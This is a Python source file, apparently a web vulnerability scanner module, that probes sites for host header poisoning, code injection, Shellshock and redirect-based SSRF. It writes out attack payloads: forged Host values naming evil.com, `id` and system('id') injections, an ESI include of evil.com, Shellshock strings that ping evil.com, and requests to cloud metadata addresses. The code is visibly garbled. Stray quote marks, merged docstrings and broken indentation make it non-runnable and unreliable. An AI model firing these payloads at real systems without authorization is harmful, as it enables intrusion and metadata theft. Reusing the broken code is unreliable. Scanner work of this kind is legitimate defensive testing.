#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License")
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


"""Advanced Web Scanning Core

This core provides comprehensive web application scanning capabilities,
including host header attacks, code injection detection, and advanced vulnerability checks.

Based on patterns from active-scan-plus-plus Burp Suite extension.
"""
import logging
import re
import requests
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
import hashlib
import aiohttp


@dataclass
class ScanResult:
    """Result from a web scan operation"""url: str
    vulnerability_type: str
    severity: str
    description: str
    evidence: str
    request_details: Dict[str, Any]
    response_details: Dict[str, Any]


@dataclass
class HostHeaderTest:
    """Host header manipulation test case"""name: str
    host_value: str
    description: str
    expected_behavior: str



class AdvancedWebScanningCore:
    """Core for advanced web application scanning and vulnerability detection.

    This core implements scanning patterns from active-scan-plus-plus,
    including host header attacks, code injection, and edge case detection.
    """
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.session = requests.Session()
        self.session.verify = False  # For testing purposes
        self.timeout = 10

        # Suppress SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    async def _make_request(
        self,
        url: str,
        method: str = "GET","        headers: Optional[Dict[str, str]] = None,
        timeout: int = 10
    ) -> Any:
        """Make an async HTTP request.

        Args:
            url: URL to request
            method: HTTP method
            headers: Request headers
            timeout: Request timeout

        Returns:
            Response object or None if failed
        """
try:
            async with aiohttp.ClientSession() as session:
                async with session.request(
                    method,
                    url,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as response:
                    # Convert aiohttp response to requests-like response for compatibility
                    class MockResponse:
                        """Mock response object for aiohttp results"""                def __init__(self, aio_response):
                            self.status_code = aio_response.status
                            self.headers = dict(aio_response.headers)
                            self.text = """                            self.url = str(aio_response.url)

                        async def read_text(self):
                            """Read response text"""                    if not self.text:
                                self.text = await response.text()
                            return self.text

                    mock_response = MockResponse(response)
                    await mock_response.read_text()
                    return mock_response

        except Exception as e:  # noqa: BLE001
            self.logger.error(f"Request failed for {url}: {e}")"            return None

    async def scan_host_header_attacks(self, base_url: str) -> List[ScanResult]:
        """Test for host header vulnerabilities including password reset poisoning and cache poisoning.

        Based on active-scan-plus-plus host header checks.
        """results: List[ScanResult] = []

        # Parse the base URL
        parsed = urlparse(base_url)
        original_host = parsed.netloc

        # Define host header test cases
        host_tests = [
            HostHeaderTest(
                name="cache_poisoning","                host_value=f"evil.com.{original_host}","                description="Cache poisoning via host header manipulation","                expected_behavior="different_response""            ),
            HostHeaderTest(
                name="password_reset_poisoning","                host_value=f"attacker.com.{original_host}","                description="Password reset poisoning via host header","                expected_behavior="host_reflection""            ),
            HostHeaderTest(
                name="host_override","                host_value="evil-attacker.com","                description="Host header override attack","                expected_behavior="host_reflection""            )
        ]

        # Get baseline response
        try:
            baseline_response = self.session.get(base_url, timeout=self.timeout)
            baseline_hash = hashlib.md5(baseline_response.text.encode()).hexdigest()
        except Exception as e:  # noqa: BLE001
            self.logger.error(f"Failed to get baseline response: {e}")"            return results

        for test in host_tests:
            try:
                headers = {"Host": test.host_value}"                response = self.session.get(base_url, headers=headers, timeout=self.timeout)

                # Check for host reflection in response
                host_reflected = test.host_value in response.text

                # Check for different response content
                response_hash = hashlib.md5(response.text.encode()).hexdigest()
                content_changed = response_hash != baseline_hash

                if host_reflected or content_changed:
                    result = ScanResult(
                        url=base_url,
                        vulnerability_type="host_header_attack","                        severity="medium","                        description=test.description,
                        evidence=(
                            f"Host: {test.host_value} - Reflected: {host_reflected}, ""                            f"Content Changed: {content_changed}""                        ),
                        request_details={"headers": headers},"                        response_details={
                            "status_code": response.status_code,"                            "content_length": len(response.text),"                            "host_reflected": host_reflected"                        }
                    )
                    results.append(result)

            except Exception as e:  # noqa: BLE001
                self.logger.error(f"Host header test failed for {test.name}: {e}")"
        return results

    async def scan_code_injection(self, urls: List[str]) -> List[ScanResult]:
        """Test for code injection vulnerabilities including blind injection patterns.

        Based on active-scan-plus-plus code injection checks.
        """results: List[ScanResult] = []

        # Code injection payloads
        payloads = [
            {"payload": "${7*7}", "type": "expression_language", "description": "EL injection"},"            {"payload": "`id`", "type": "command_injection", "description": "Command injection"},"            {"payload": "system('id')", "type": "php_injection", "description": "PHP system injection"},"'            {"payload": "exec('id')", "type": "python_injection", "description": "Python exec injection"},"'            {"payload": "<esi:include src='http://evil.com'>", "type": "esi_injection", "description": "ESI injection"}"'        ]

        for url in urls:
            for payload in payloads:
                try:
                    # Test in query parameters
                    test_url = f"{url}{'&' if '?' in url else '?'}test={payload['payload']}""'                    response = self.session.get(test_url, timeout=self.timeout)

                    # Check for payload reflection or execution evidence
                    if payload["payload"] in response.text:"                        result = ScanResult(
                            url=test_url,
                            vulnerability_type=f"{payload['type']}_reflection","'                            severity="high","                            description=f"{payload['description']} - payload reflected in response","'                            evidence=f"Payload: {payload['payload']} found in response","'                            request_details={"url": test_url},"                            response_details={"status_code": response.status_code}"                        )
                        results.append(result)

                    # Check for specific execution indicators
                    if payload["type"] == "expression_language" and "49" in response.text:"                        result = ScanResult(
                            url=test_url,
                            vulnerability_type="expression_language_execution","                            severity="critical","                            description="Expression language execution detected","                            evidence="EL expression ${7*7} evaluated to 49","                            request_details={"url": test_url},"                            response_details={"status_code": response.status_code}"                        )
                        results.append(result)

                except Exception as e:  # noqa: BLE001
                    self.logger.error(f"Code injection test failed for {url}: {e}")"
        return results

    async def scan_shellshock(self, urls: List[str]) -> List[ScanResult]:
        """Test for Shellshock (CVE-2014-6271) vulnerability.

        Based on active-scan-plus-plus Shellshock detection.
        """results: List[ScanResult] = []

        shellshock_payloads = [
            "() { :; }; echo 'Shellshock vulnerable'","'            "() { :;}; /bin/bash -c 'echo vulnerable'","'            "() { :; }; ping -c 1 evil.com""        ]

        for url in urls:
            for payload in shellshock_payloads:
                try:
                    headers = {
                        "User-Agent": payload,"                        "Referer": payload,"                        "Cookie": f"test={payload}""                    }

                    response = self.session.get(url, headers=headers, timeout=self.timeout)

                    # Check for shellshock execution indicators
                    if "vulnerable" in response.text.lower() or "shellshock" in response.text.lower():"                        result = ScanResult(
                            url=url,
                            vulnerability_type="shellshock","                            severity="critical","                            description="Shellshock vulnerability detected","                            evidence=f"Shellshock payload executed: {payload}","                            request_details={"headers": headers},"                            response_details={"status_code": response.status_code}"                        )
                        results.append(result)

                except Exception as e:  # noqa: BLE001
                    self.logger.error(f"Shellshock test failed for {url}: {e}")"
        return results

    async def scan_input_transformation(self, urls: List[str]) -> List[ScanResult]:
        """Test for suspicious input transformations that may indicate filter bypasses.

        Based on active-scan-plus-plus transformation detection.
        """results: List[ScanResult] = []

        transformation_tests = [
            {
                "input": "7*7","                "expected_output": "49","                "description": "Arithmetic expression evaluation""            },
            {
                "input": "\\\\","                "expected_output": "\\","                "description": "Backslash escaping bypass""            },
            {
                "input": "<script>","                "expected_output": "&lt;script&gt;","                "description": "HTML entity encoding bypass""            }
        ]

        for url in urls:
            for test in transformation_tests:
                try:
                    test_url = f"{url}{'&' if '?' in url else '?'}test={test['input']}""'                    response = self.session.get(test_url, timeout=self.timeout)

                    if test["expected_output"] in response.text and test["input"] in response.text:"                        result = ScanResult(
                            url=test_url,
                            vulnerability_type="input_transformation","                            severity="medium","                            description=f"Suspicious input transformation: {test['description']}","'                            evidence=f"Input '{test['input']}' transformed to '{test['expected_output']}'","'                            request_details={"url": test_url},"                            response_details={"status_code": response.status_code}"                        )
                        results.append(result)

                except Exception as e:  # noqa: BLE001
                    self.logger.error(f"Input transformation test failed for {url}: {e}")"
        return results

    async def scan_http_redirects_ssrf(
        self,
        base_url: str,
        redirect_urls: Optional[List[str]] = None
    ) -> List[ScanResult]:
        """Test for HTTP redirect-based SSRF vulnerabilities.

        Based on patterns from .external/30X repository.
        Tests various redirect status codes (301, 302, 303, 307, 308) for SSRF potential.

        Args:
            base_url: Base URL to test
            redirect_urls: List of URLs to test for redirection SSRF

        Returns:
            List of SSRF vulnerability findings
        """results: List[ScanResult] = []

        if not redirect_urls:
            # Default test URLs that might be vulnerable to SSRF
            redirect_urls = [
                "http://127.0.0.1:80","                "http://localhost:8080","                "http://169.254.169.254",  # AWS metadata"                "http://metadata.google.internal",  # GCP metadata"                "http://100.100.100.200",  # Alibaba metadata"            ]

        redirect_codes = [301, 302, 303, 307, 308]

        for redirect_code in redirect_codes:
            for target_url in redirect_urls:
                try:
                    # Test if the application accepts redirect parameters
                    test_url = f"{base_url}/redirect/{redirect_code}/{target_url}""
                    response = await self._make_request(test_url, method="GET", timeout=10)"
                    if response and response.status_code == redirect_code:
                        location_header = response.headers.get('Location', '')'
                        # Check if redirect was followed to internal service
                        if self._is_internal_redirect(location_header, target_url):
                            results.append(ScanResult(
                                url=test_url,
                                vulnerability_type="HTTP_Redirect_SSRF","                                severity="high","                                description=f"HTTP {redirect_code} redirect to internal service detected","                                evidence=f"Redirected to: {location_header}","                                request_details={
                                    "method": "GET","                                    "url": test_url,"                                    "headers": {}"                                },
                                response_details={
                                    "status_code": response.status_code,"                                    "headers": dict(response.headers),"                                    "content_length": len(response.text) if response.text else 0"                                }
                            ))

                    # Test with query parameters (alternative injection method)
                    test_url_params = f"{base_url}?redirect_code={redirect_code}&target={target_url}""
                    response = await self._make_request(test_url_params, method="GET", timeout=10)"
                    if response and response.status_code == redirect_code:
                        location_header = response.headers.get('Location', '')'
                        if self._is_internal_redirect(location_header, target_url):
                            results.append(ScanResult(
                                url=test_url_params,
                                vulnerability_type="HTTP_Redirect_SSRF_Query","                                severity="high","                                description=(
                                    f"HTTP {redirect_code} redirect via query parameters ""                                    "to internal service""                                ),
                                evidence=f"Redirected to: {location_header}","                                request_details={
                                    "method": "GET","                                    "url": test_url_params,"                                    "headers": {}"                                },
                                response_details={
                                    "status_code": response.status_code,"                                    "headers": dict(response.headers),"                                    "content_length": len(response.text) if response.text else 0"                                }
                            ))

                except Exception as e:  # noqa: BLE001
                    self.logger.error(f"HTTP redirect SSRF test failed for {base_url}: {e}")"
        return results

    def _is_internal_redirect(self, location_header: str, target_url: str) -> bool:
        """Check if a redirect location indicates internal service access.

        Args:
            location_header: The Location header value
            target_url: The intended target URL

        Returns:
            True if redirect appears to access internal services
        """if not location_header:
            return False

        # Check for common internal service indicators
        internal_indicators = [
            '127.0.0.1','            'localhost','            '169.254.169.254',  # AWS metadata'            'metadata.google.internal',  # GCP metadata'            '100.100.100.200',  # Alibaba metadata'            '10.',  # Private IP ranges'            '172.',  # Private IP ranges'            '192.168.',  # Private IP ranges'        ]

        location_lower = location_header.lower()
        target_lower = target_url.lower()

        # Check if location header contains internal indicators
        for indicator in internal_indicators:
            if indicator in location_lower:
                return True

        # Check if redirect was actually followed to target
        if target_lower in location_lower:
            return True

        return False

    async def comprehensive_scan(
        self,
        base_url: str,
        scan_types: Optional[List[str]] = None
    ) -> Dict[str, List[ScanResult]]:
        """Perform a comprehensive web application scan.

        Args:
            base_url: Base URL to scan
            scan_types: List of scan types to perform (default: all)

        Returns:
            Dictionary of scan results by type
        """if scan_types is None:
            scan_types = [
                "host_header","                "code_injection","                "shellshock","                "input_transformation","                "http_redirect_ssrf""            ]

        results: Dict[str, List[ScanResult]] = {}

        # Discover URLs to scan (basic crawling)
        urls_to_scan = await self.discover_urls(base_url)

        if "host_header" in scan_types:"            self.logger.info("Scanning for host header attacks...")"            results["host_header"] = await self.scan_host_header_attacks(base_url)"
        if "code_injection" in scan_types:"            self.logger.info("Scanning for code injection vulnerabilities...")"            results["code_injection"] = await self.scan_code_injection(urls_to_scan)"
        if "shellshock" in scan_types:"            self.logger.info("Scanning for Shellshock vulnerability...")"            results["shellshock"] = await self.scan_shellshock(urls_to_scan)"
        if "input_transformation" in scan_types:"            self.logger.info("Scanning for input transformation issues...")"            results["input_transformation"] = await self.scan_input_transformation(urls_to_scan)"
        if "http_redirect_ssrf" in scan_types:"            self.logger.info("Scanning for HTTP redirect SSRF vulnerabilities...")"            results["http_redirect_ssrf"] = await self.scan_http_redirects_ssrf(base_url)"
        return results

    async def discover_urls(self, base_url: str, _max_depth: int = 2) -> List[str]:
        """Basic URL discovery through HTML parsing.

        Returns a list of URLs found on the base page.
        """urls = [base_url]

        try:
            response = self.session.get(base_url, timeout=self.timeout)
            # Simple regex to find URLs in HTML
            url_pattern = r'href=["\']([^"\']+)["\']'"'            matches = re.findall(url_pattern, response.text, re.IGNORECASE)

            for match in matches:
                full_url = urljoin(base_url, match)
                if full_url.startswith(base_url) and full_url not in urls:
                    urls.append(full_url)

        except Exception as e:  # noqa: BLE001
            self.logger.error(f"URL discovery failed: {e}")"
        return urls[:20]  # Limit to 20 URLs

    async def generate_scan_report(self, scan_results: Dict[str, List[ScanResult]]) -> Dict[str, Any]:
        """Generate a comprehensive scan report.

        Args:
            scan_results: Results from comprehensive_scan

        Returns:
            Formatted report dictionary
        """total_findings = sum(len(results) for results in scan_results.values())

        # Count by severity
        severity_counts: Dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}"        vulnerability_types: Dict[str, int] = {}

        for results in scan_results.values():
            for result in results:
                severity_counts[result.severity] = severity_counts.get(result.severity, 0) + 1
                vuln_type = result.vulnerability_type
                vulnerability_types[vuln_type] = vulnerability_types.get(vuln_type, 0) + 1

        report = {
            "scan_summary": {"                "total_findings": total_findings,"                "severity_breakdown": severity_counts,"                "vulnerability_types": vulnerability_types,"                "scan_types_performed": list(scan_results.keys())"            },
            "detailed_findings": scan_results,"            "recommendations": ["                "Review and fix host header vulnerabilities to prevent cache poisoning","                "Implement proper input validation and sanitization","                "Update systems to patch known vulnerabilities (Shellshock, etc.)","                "Monitor for unusual input transformations that may indicate bypasses","                "Implement Content Security Policy (CSP) headers","                "Use parameterized queries to prevent injection attacks""            ]
        }

        return report
